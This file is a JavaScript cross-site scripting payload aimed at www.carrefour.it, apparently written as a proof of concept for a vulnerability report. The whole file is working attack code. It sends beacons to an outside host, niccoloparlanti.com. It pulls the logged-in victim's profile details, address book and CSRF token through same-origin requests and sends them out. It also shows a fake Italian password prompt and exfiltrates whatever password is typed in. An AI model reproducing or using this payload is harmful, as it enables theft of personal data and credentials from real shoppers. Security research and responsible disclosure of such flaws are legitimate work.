// https://niccoloparlanti.com/a.js  — imported by the XSS, runs in the www.carrefour.it origin
(async () => {
const beacon = q => { new Image().src = 'https://niccoloparlanti.com/collect?' + q; };

// 0) proof the module executed IN the carrefour origin
beacon('hit=import_ok&origin=' + encodeURIComponent(document.domain) + '&url=' + encodeURIComponent(location.href));

// 1) authenticated PII exfiltration (same-origin, victim cookies ride along)
try {
  const p = await (await fetch('/account/profile', { headers: { 'X-Requested-With': 'XMLHttpRequest' } })).json();
  const addr = await (await fetch('/on/demandware.store/Sites-carrefour-IT-Site/it_IT/Account-AddressBook', { headers: {
'X-Requested-With': 'XMLHttpRequest' } })).text();
  beacon('pii=' + encodeURIComponent(JSON.stringify({
    name: p.firstname + ' ' + p.lastname, email: p.email, phone: p.phone, dob: p.birthday, gender: p.gender, csrf: p.csrf
&& p.csrf.token
  })));
  beacon('addressbook=' + encodeURIComponent(addr.slice(0, 1800)));
} catch (e) { beacon('pii_err=' + encodeURIComponent('' + e)); }

// 2) same-origin credential phishing (browser shows "www.carrefour.it says:")
const pw = prompt('Carrefour: per la tua sicurezza, reinserisci la password per continuare');
if (pw) beacon('password=' + encodeURIComponent(pw));

// 3) visible confirmation when you test it in a browser
document.documentElement.innerHTML =
  '<h2 style="font-family:sans-serif;padding:40px">XSS module executed in <code>' + document.domain +
  '</code> — PII + password sent to niccoloparlanti.com</h2>';
})();
